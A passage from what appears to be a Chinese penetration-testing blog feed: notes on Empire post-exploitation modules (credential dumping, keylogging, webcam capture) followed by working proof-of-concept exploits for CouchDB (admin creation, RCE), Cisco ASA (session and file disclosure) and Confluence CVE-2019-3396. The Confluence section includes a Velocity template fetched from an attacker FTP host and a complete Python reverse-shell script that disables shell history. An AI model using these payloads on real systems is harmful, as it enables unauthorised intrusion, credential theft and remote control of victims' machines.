<h1 id="选择载荷"><a href="#选择载荷" class="headerlink" title="选择载荷"></a>选择载荷</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">multi&#x2F;bash		生成python的执行马，可选powershell和python</span><br><span class="line">multi&#x2F;launcher	生成一句话，可选powershell和python</span><br><span class="line">multi&#x2F;macro		生成恶意宏代码</span><br><span class="line">multi&#x2F;pyinstaller  用pyinstaller打包的可执行文件，由于empire是在Linux下运行的，所以打包的是Linux的可执行文件</span><br><span class="line">multi&#x2F;war		生成可发布的war包，执行后java调用powershell或python上线</span><br><span class="line">windows&#x2F;bunny	bunny执行文件</span><br><span class="line">windows&#x2F;ducky	ducky执行文件</span><br><span class="line">windows&#x2F;csharp_exe	生成C#源码</span><br><span class="line">windows&#x2F;launcher_lnk	为指定的应用程序生成一个恶意lnk</span><br><span class="line">windows&#x2F;teensy	teensy执行文件</span><br><span class="line">windows&#x2F;wmic	生成xsl</span><br></pre></td></tr></table></figure>
<p>其实这里的载荷原理大同小异，核心代码都是multi/launcher里的，可以针对性做免杀</p>
<h1 id="agent操作"><a href="#agent操作" class="headerlink" title="agent操作"></a>agent操作</h1><p>interact进入agent</p>
<p>基本命令shell、upload、list、info。</p>
<p>在interact种，核心是模块</p>
<h2 id="code-execution"><a href="#code-execution" class="headerlink" title="code_execution"></a>code_execution</h2><p>字面意思，代码执行。</p>
<p>Assembly指定程序</p>
<h3 id="code-execution-invoke-assembly"><a href="#code-execution-invoke-assembly" class="headerlink" title="code_execution/invoke_assembly"></a>code_execution/invoke_assembly</h3><p>从内存执行donet程序，可以绕过一些防护</p>
<h3 id="code-execution-invoke-dllinjection"><a href="#code-execution-invoke-dllinjection" class="headerlink" title="code_execution/invoke_dllinjection"></a>code_execution/invoke_dllinjection</h3><p>dll注入，使用的PowerSploit里的。</p>
<p>ProcessID指定要注入的ID</p>
<p>DLL指定要注入的dll</p>
<h3 id="code-execution-invoke-metasploitpayload"><a href="#code-execution-invoke-metasploitpayload" class="headerlink" title="code_execution/invoke_metasploitpayload"></a>code_execution/invoke_metasploitpayload</h3><p>使用msf的web_delivery模块注入</p>
<p>URL指定web_delivery的URL</p>
<h3 id="code-execution-invoke-ntsd"><a href="#code-execution-invoke-ntsd" class="headerlink" title="code_execution/invoke_ntsd"></a>code_execution/invoke_ntsd</h3><p>使用NTSD派生一个agent</p>
<h3 id="code-execution-invoke-reflectivepeinjection"><a href="#code-execution-invoke-reflectivepeinjection" class="headerlink" title="code_execution/invoke_reflectivepeinjection"></a>code_execution/invoke_reflectivepeinjection</h3><p>PowerSploit里的反射型注入，你问这个注入有什么不一样的地方，我也不知道。</p>
<h3 id="code-execution-invoke-shellcode"><a href="#code-execution-invoke-shellcode" class="headerlink" title="code_execution/invoke_shellcode"></a>code_execution/invoke_shellcode</h3><p>还是PowerSploit里的模块，执行shellcode。要c#的</p>
<p>Shellcode指定shellcode</p>
<h3 id="code-execution-invoke-shellcodemsil"><a href="#code-execution-invoke-shellcodemsil" class="headerlink" title="code_execution/invoke_shellcodemsil"></a>code_execution/invoke_shellcodemsil</h3><p>在powershell种不调用win32 API来执行shellcode的方式，对shellcode要求严格</p>
<p>还是别用这个了</p>
<h2 id="collection"><a href="#collection" class="headerlink" title="collection"></a>collection</h2><p>字面意思，信息搜集</p>
<h3 id="collection-ChromeDump"><a href="#collection-ChromeDump" class="headerlink" title="collection/ChromeDump"></a>collection/ChromeDump</h3><p>尝试获取Chrome密码</p>
<h3 id="collection-FoxDump"><a href="#collection-FoxDump" class="headerlink" title="collection/FoxDump"></a>collection/FoxDump</h3><h3 id="collection-SharpChromium"><a href="#collection-SharpChromium" class="headerlink" title="collection/SharpChromium"></a>collection/SharpChromium</h3><h3 id="collection-USBKeylogger"><a href="#collection-USBKeylogger" class="headerlink" title="collection/USBKeylogger"></a>collection/USBKeylogger</h3><p>看UK的日志</p>
<h3 id="collection-WebcamRecorder"><a href="#collection-WebcamRecorder" class="headerlink" title="collection/WebcamRecorder"></a>collection/WebcamRecorder</h3><p>摄像头</p>
<h3 id="collection-browser-data"><a href="#collection-browser-data" class="headerlink" title="collection/browser_data"></a>collection/browser_data</h3><p>浏览器数据</p>
<h3 id="collection-clipboard-monitor"><a href="#collection-clipboard-monitor" class="headerlink" title="collection/clipboard_monitor"></a>collection/clipboard_monitor</h3><p>粘贴板监控</p>
<h3 id="collection-file-finder"><a href="#collection-file-finder" class="headerlink" title="collection/file_finder"></a>collection/file_finder</h3><p>查找IPC共享文件</p>
<h3 id="find-interesting-file"><a href="#find-interesting-file" class="headerlink" title="find_interesting_file"></a>find_interesting_file</h3><p>一样</p>
<h3 id="collection-get-winupdates"><a href="#collection-get-winupdates" class="headerlink" title="collection/get-winupdates"></a>collection/get-winupdates</h3><p>获取更新历史</p>
<h3 id="collection-get-indexed-item"><a href="#collection-get-indexed-item" class="headerlink" title="collection/get_indexed_item"></a>collection/get_indexed_item</h3><h3 id="collection-get-sql-column-sample-data"><a href="#collection-get-sql-column-sample-data" class="headerlink" title="collection/get_sql_column_sample_data"></a>collection/get_sql_column_sample_data</h3><h3 id="collection-get-sql-query"><a href="#collection-get-sql-query" class="headerlink" title="collection/get_sql_query"></a>collection/get_sql_query</h3><p>后面不写了都是获取各种信息的东西</p>
<h2 id="credentials"><a href="#credentials" class="headerlink" title="credentials"></a>credentials</h2><p>获取凭证和token的</p>
<h2 id="exfiltration"><a href="#exfiltration" class="headerlink" title="exfiltration"></a>exfiltration</h2><p>扫端口</p>
<h2 id="lateral-movement"><a href="#lateral-movement" class="headerlink" title="lateral_movement"></a>lateral_movement</h2><p>横向</p>
<h2 id="management"><a href="#management" class="headerlink" title="management"></a>management</h2><h2 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h2><p>权限维持的</p>
<h2 id="privesc"><a href="#privesc" class="headerlink" title="privesc"></a>privesc</h2><p>提权</p>
<p>recon</p>
<p>situational_awareness</p>
<p>trollsploit</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Empire</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-CouchDB</title>
    <url>/2021/04/15/Apache-CouchDB/</url>
    <content><![CDATA[<p><em>CouchDB</em>是由Apache软件基金会开发的一个开源数据库。重点是易于使用,拥抱网络。它是一个NoSQL文档存储数据库。<a id="more"></a></p>
<h1 id="CVE-2017-12635-身份绕过"><a href="#CVE-2017-12635-身份绕过" class="headerlink" title="CVE-2017-12635-身份绕过"></a>CVE-2017-12635-身份绕过</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送如下数据包，可成功创建管理员用户，账户密码均为vulhub，web界面登录地址为：http:&#x2F;&#x2F;192.168.70.45:5984&#x2F;_utils&#x2F;</span><br><span class="line"></span><br><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.70.45:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2017-12636-RCE"><a href="#CVE-2017-12636-RCE" class="headerlink" title="CVE-2017-12636-RCE"></a>CVE-2017-12636-RCE</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;10.5.132.35:29080&#39;</span><br><span class="line">command &#x3D; &#39;&quot;ping x.x.x.x&quot;&#39;</span><br><span class="line">version &#x3D; 1</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">session.headers &#x3D; &#123;</span><br><span class="line">    &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;</span><br><span class="line">&#125;</span><br><span class="line"># session.proxies &#x3D; &#123;</span><br><span class="line">#     &#39;http&#39;: &#39;http:&#x2F;&#x2F;127.0.0.1:8085&#39;</span><br><span class="line"># &#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">session.put(target + &#39;&#x2F;_users&#x2F;org.couchdb.user:wooyun&#39;, data&#x3D;&#39;&#39;&#39;&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;wooyun&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;wooyun&quot;</span><br><span class="line">&#125;&#39;&#39;&#39;)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">session.auth &#x3D; HTTPBasicAuth(&#39;zxc12&#39;, &#39;zxc12&#39;)</span><br><span class="line"></span><br><span class="line">#command &#x3D; &quot;bash -c &#39;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;&quot; % base64.b64encode(command).decode()</span><br><span class="line">if version &#x3D;&#x3D; 1:</span><br><span class="line">    session.put(target + (&#39;&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39;), data&#x3D;json.dumps(command))</span><br><span class="line">else:</span><br><span class="line">    host &#x3D; session.get(target + &#39;&#x2F;_membership&#39;).json()[&#39;all_nodes&#39;][0]</span><br><span class="line">    session.put(target + &#39;&#x2F;_node&#x2F;&#123;&#125;&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39;.format(host), data&#x3D;json.dumps(command))</span><br><span class="line"></span><br><span class="line">session.put(target + &#39;&#x2F;zxc12&#39;)</span><br><span class="line">session.put(target + &#39;&#x2F;zxc12&#x2F;test&#39;, data&#x3D;&#39;&#123;&quot;_id&quot;: &quot;zxc12test&quot;&#125;&#39;)</span><br><span class="line"></span><br><span class="line">if version &#x3D;&#x3D; 1:</span><br><span class="line">    session.post(target + &#39;&#x2F;zxc12&#x2F;_temp_view?limit&#x3D;10&#39;, data&#x3D;&#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39;)</span><br><span class="line">else:</span><br><span class="line">    session.put(target + &#39;&#x2F;zxc12&#x2F;_design&#x2F;test&#39;, data&#x3D;&#39;&#123;&quot;_id&quot;:&quot;_design&#x2F;test&quot;,&quot;views&quot;:&#123;&quot;zxc12&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39;)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-CouchDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Cisco</title>
    <url>/2021/04/15/Cisco/</url>
    <content><![CDATA[<p>思科设备的漏洞<a id="more"></a></p>
<h1 id="CVE-2018-0296-信息泄露"><a href="#CVE-2018-0296-信息泄露" class="headerlink" title="CVE-2018-0296-信息泄露"></a>CVE-2018-0296-信息泄露</h1><p>思科vpn</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import urlparse</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;&quot;</span><br><span class="line">      _____ _____ _____ _____ _____    ___   _____  ___         </span><br><span class="line">     &#x2F;  __ \_   _&#x2F;  ___&#x2F;  __ \  _  |  &#x2F; _ \ &#x2F;  ___|&#x2F; _ \        </span><br><span class="line">     | &#x2F;  \&#x2F; | | \ &#96;--.| &#x2F;  \&#x2F; | | | &#x2F; &#x2F;_\ \\ &#96;--.&#x2F; &#x2F;_\ \       </span><br><span class="line">     | |     | |  &#96;--. \ |   | | | | |  _  | &#96;--. \  _  |       </span><br><span class="line">     | \__&#x2F;\_| |_&#x2F;\__&#x2F; &#x2F; \__&#x2F;\ \_&#x2F; &#x2F; | | | |&#x2F;\__&#x2F; &#x2F; | | |       </span><br><span class="line">      \____&#x2F;\___&#x2F;\____&#x2F; \____&#x2F;\___&#x2F;  \_| |_&#x2F;\____&#x2F;\_| |_&#x2F;        </span><br><span class="line">                                                                </span><br><span class="line">______     _   _       _____                                  _ </span><br><span class="line">| ___ \   | | | |     |_   _|                                | |</span><br><span class="line">| |_&#x2F; &#x2F;_ _| |_| |__     | |_ __ __ ___   _____ _ __ ___  __ _| |</span><br><span class="line">|  __&#x2F; _&#96; | __| &#39;_ \    | | &#39;__&#x2F; _&#96; \ \ &#x2F; &#x2F; _ \ &#39;__&#x2F; __|&#x2F; _&#96; | |</span><br><span class="line">| | | (_| | |_| | | |   | | | | (_| |\ V &#x2F;  __&#x2F; |  \__ \ (_| | |</span><br><span class="line">\_|  \__,_|\__|_| |_|   \_&#x2F;_|  \__,_| \_&#x2F; \___|_|  |___&#x2F;\__,_|_|</span><br><span class="line">                                                                </span><br><span class="line">                CVE-2018-0296</span><br><span class="line">  Script author: Yassine Aboukir(@yassineaboukir)</span><br><span class="line">    &quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">url &#x3D; sys.argv[1]</span><br><span class="line"></span><br><span class="line">regexSess &#x3D; r&quot;([0-9])\w+&#39;&quot;</span><br><span class="line">regexUser &#x3D; r&quot;(user:)\w+&quot;</span><br><span class="line"></span><br><span class="line">dir_path &#x3D; os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">filelist_dir &#x3D; &quot;&#x2F;+CSCOU+&#x2F;..&#x2F;+CSCOE+&#x2F;files&#x2F;file_list.json?path&#x3D;&#x2F;&quot;</span><br><span class="line">CSCOE_dir &#x3D; &quot;&#x2F;+CSCOU+&#x2F;..&#x2F;+CSCOE+&#x2F;files&#x2F;file_list.json?path&#x3D;%2bCSCOE%2b&quot;</span><br><span class="line">active_sessions &#x3D; &quot;&#x2F;+CSCOU+&#x2F;..&#x2F;+CSCOE+&#x2F;files&#x2F;file_list.json?path&#x3D;&#x2F;sessions&#x2F;&quot;</span><br><span class="line">logon &#x3D; &quot;&#x2F;+CSCOE+&#x2F;logon.html&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">  is_cisco_asa &#x3D; requests.get(urlparse.urljoin(url,logon), verify&#x3D;False, allow_redirects&#x3D;False)</span><br><span class="line">except requests.exceptions.RequestException as e:</span><br><span class="line">  print(e)</span><br><span class="line">  sys.exit(1)</span><br><span class="line"></span><br><span class="line">if &quot;webvpnLang&quot; in is_cisco_asa.cookies:</span><br><span class="line">    try:</span><br><span class="line">      filelist_r &#x3D; requests.get(urlparse.urljoin(url,filelist_dir), verify&#x3D;False)</span><br><span class="line">      CSCOE_r &#x3D; requests.get(urlparse.urljoin(url,CSCOE_dir), verify&#x3D;False)</span><br><span class="line">      active_sessions_r &#x3D; requests.get(urlparse.urljoin(url,active_sessions), verify&#x3D;False)</span><br><span class="line"></span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">      print(e)</span><br><span class="line">      sys.exit(1)</span><br><span class="line"> </span><br><span class="line">    if str(filelist_r.status_code) &#x3D;&#x3D; &quot;200&quot;:</span><br><span class="line">      with open(urlparse.urlparse(url).hostname+&quot;.txt&quot;, &quot;w&quot;) as cisco_dump:</span><br><span class="line">        cisco_dump.write(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Directory Index &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n &#123;&#125;\n &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; +CSCEO+ Directory &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n &#123;&#125;\n &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Active sessions &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n &#123;&#125;\n &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Active Users &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;.format(filelist_r.text, CSCOE_r.text, active_sessions_r.text))</span><br><span class="line">        </span><br><span class="line">        &#39;&#39;&#39; Extraccion de usuarios&#39;&#39;&#39;</span><br><span class="line">        matches_sess &#x3D; re.finditer(regexSess, active_sessions_r.text)</span><br><span class="line">        for match_sess in matches_sess:</span><br><span class="line">            active_users_r &#x3D; requests.get(urlparse.urljoin(url,&quot;&#x2F;+CSCOU+&#x2F;..&#x2F;+CSCOE+&#x2F;files&#x2F;file_list.json?path&#x3D;&#x2F;sessions&#x2F;&quot;+str(match_sess.group().strip(&quot;&#39;&quot;))), verify&#x3D;False)</span><br><span class="line">            matches_user &#x3D; re.finditer(regexUser, active_users_r.text)</span><br><span class="line"></span><br><span class="line">            for match_user in matches_user:</span><br><span class="line">              cisco_dump.write(match_user.group()+&quot;\n&quot;)</span><br><span class="line">        &#39;&#39;&#39; Fin Extraccion de usuarios&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">        print(&quot;Vulnerable! Check the text dump saved in &#123;&#125;&quot;.format(dir_path))</span><br><span class="line">    else: print(&quot;Not vulnerable!&quot;)</span><br><span class="line"></span><br><span class="line">else: </span><br><span class="line">  print(&quot;This is not Cisco ASA! e.g: https:&#x2F;&#x2F;vpn.example.com&#x2F;+CSCOE+&#x2F;logon.html\n&quot;)</span><br><span class="line">  sys.exit(1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-3452-文件读取"><a href="#CVE-2020-3452-文件读取" class="headerlink" title="CVE-2020-3452-文件读取"></a>CVE-2020-3452-文件读取</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;+CSCOT+&#x2F;translation-table?type&#x3D;mst&amp;textdomain&#x3D;&#x2F;%2bCSCOE%2b&#x2F;portal_inc.lua&amp;default-language&amp;lang&#x3D;..&#x2F;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Cisco</tag>
      </tags>
  </entry>
  <entry>
    <title>Confluence</title>
    <url>/2021/04/14/Confluence/</url>
    <content><![CDATA[<p><em>Confluence</em>是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。<a id="more"></a></p>
<h1 id="CVE-2019-3396-RCE"><a href="#CVE-2019-3396-RCE" class="headerlink" title="CVE-2019-3396-RCE"></a>CVE-2019-3396-RCE</h1><p><em>以下内容取自jas502n</em></p>
<p>工具：CVE-2019-3396.zip</p>
<h3 id="Confluence-未授权-RCE-CVE-2019-3396-漏洞"><a href="#Confluence-未授权-RCE-CVE-2019-3396-漏洞" class="headerlink" title="Confluence 未授权 RCE (CVE-2019-3396) 漏洞"></a>Confluence 未授权 RCE (CVE-2019-3396) 漏洞</h3><h4 id="坑点：有些版本需要加Referer才能成功"><a href="#坑点：有些版本需要加Referer才能成功" class="headerlink" title="坑点：有些版本需要加Referer才能成功"></a>坑点：有些版本需要加Referer才能成功</h4><p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/preview.jpg"></p>
<h2 id="File-Read"><a href="#File-Read" class="headerlink" title="File Read"></a>File Read</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;rest&#x2F;tinymce&#x2F;1&#x2F;macro&#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.20.181</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0</span><br><span class="line">Accept: text&#x2F;plain, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.10.20.181&#x2F;</span><br><span class="line">Content-Length: 167</span><br><span class="line">X-Forwarded-For: 127.0.0.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;1&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https:&#x2F;&#x2F;www.viddler.com&#x2F;v&#x2F;test&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/passwd.jpg"></p>
<h2 id="excute-ifconfig"><a href="#excute-ifconfig" class="headerlink" title="excute ifconfig"></a>excute ifconfig</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;rest&#x2F;tinymce&#x2F;1&#x2F;macro&#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.20.181</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0</span><br><span class="line">Accept: text&#x2F;plain, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.10.20.181&#x2F;</span><br><span class="line">Content-Length: 198</span><br><span class="line">X-Forwarded-For: 127.0.0.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;1&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https:&#x2F;&#x2F;www.viddler.com&#x2F;v&#x2F;test&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;ftp:&#x2F;&#x2F;10.10.20.166:8886&#x2F;r.vm&quot;,&quot;command&quot;:&quot;ifconfig&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/conmmand-look.jpg"></p>
<h2 id="python-ftp"><a href="#python-ftp" class="headerlink" title="python ftp"></a>python ftp</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line"></span><br><span class="line">python -m pyftpdlib -p  8888</span><br></pre></td></tr></table></figure>
<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/ftp.jpg"><br><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/login.jpg"></p>
<h2 id="r-vm"><a href="#r-vm" class="headerlink" title="r.vm"></a>r.vm</h2><p>from  <a href="https://github.com/pyn3rd/CVE-2019-3396">https://github.com/pyn3rd/CVE-2019-3396</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set ($exp&#x3D;&quot;exp&quot;)</span><br><span class="line">#set ($a&#x3D;$exp.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($command))</span><br><span class="line">#set ($input&#x3D;$exp.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">#set($sc &#x3D; $exp.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">#set($constructor &#x3D; $sc.getDeclaredConstructor($exp.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">#set($scan&#x3D;$constructor.newInstance($input).useDelimiter(&quot;\\A&quot;))</span><br><span class="line">#if($scan.hasNext())</span><br><span class="line">    $scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
<h2 id="弹shell"><a href="#弹shell" class="headerlink" title="弹shell"></a>弹shell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;rest&#x2F;tinymce&#x2F;1&#x2F;macro&#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.20.181</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0</span><br><span class="line">Accept: text&#x2F;plain, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.10.20.181&#x2F;</span><br><span class="line">Content-Length: 232</span><br><span class="line">X-Forwarded-For: 127.0.0.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;1&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https:&#x2F;&#x2F;www.viddler.com&#x2F;v&#x2F;test&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;ftp:&#x2F;&#x2F;10.10.20.166:8888&#x2F;r.vm&quot;,&quot;command&quot;:&quot;setsid python &#x2F;tmp&#x2F;nc.py 10.10.20.166 8989&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="nc-py"><a href="#nc-py" class="headerlink" title="nc.py"></a>nc.py</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">back connect py version,only linux have pty module</span><br><span class="line">code by google security team</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import sys,os,socket,pty</span><br><span class="line">shell &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">def usage(name):</span><br><span class="line">    print &#39;python reverse connector&#39;</span><br><span class="line">    print &#39;usage: %s &lt;ip_addr&gt; &lt;port&gt;&#39; % name</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) !&#x3D;3:</span><br><span class="line">        usage(sys.argv[0])</span><br><span class="line">        sys.exit()</span><br><span class="line">    s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        s.connect((sys.argv[1],int(sys.argv[2])))</span><br><span class="line">        print &#39;connect ok&#39;</span><br><span class="line">    except:</span><br><span class="line">        print &#39;connect faild&#39;</span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    global shell</span><br><span class="line">    os.unsetenv(&quot;HISTFILE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTFILESIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTORY&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSAVE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTZONE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTLOG&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTCMD&quot;)</span><br><span class="line">    os.putenv(&quot;HISTFILE&quot;,&#39;&#x2F;dev&#x2F;null&#39;)</span><br><span class="line">    os.putenv(&quot;HISTSIZE&quot;,&#39;0&#39;)</span><br><span class="line">    os.putenv(&quot;HISTFILESIZE&quot;,&#39;0&#39;)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/shell.jpg"></p>
